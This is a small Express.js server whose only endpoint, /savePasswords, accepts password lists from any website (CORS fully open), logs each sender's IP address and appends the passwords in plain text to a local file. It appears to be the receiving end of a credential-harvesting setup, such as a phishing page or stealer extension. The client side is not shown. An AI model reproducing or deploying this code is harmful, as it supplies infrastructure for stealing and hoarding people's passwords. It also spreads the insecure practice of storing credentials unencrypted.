const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");
const cors = require("cors");

const app = express();
const port = 3000;

app.use(cors());
app.use(bodyParser.json());

app.post("/savePasswords", (req, res) => {
  const { passwords, userData } = req.body;
  const userIp = req.headers["x-forwarded-for"] || req.remoteAddress;

  console.log("IP:", userIp);

  const password = `Passwords:\n${passwords.join("\n")}\n\n`;

  const filePath = __dirname + "/passwords.txt";

  fs.appendFile(filePath, password, (err) => {
    if (err) {
      console.error("Failed save password:", err);
      res
        .status(500)
        .json({ error: "Error Server", details: err.message });
    } else {
      console.log("Passwords saved");
      res.json({ message: "Passwords saved" });
    }
  });
});

app.listen(port, () => {
  console.log(`Server is running at http://localhost:${port}`);
});
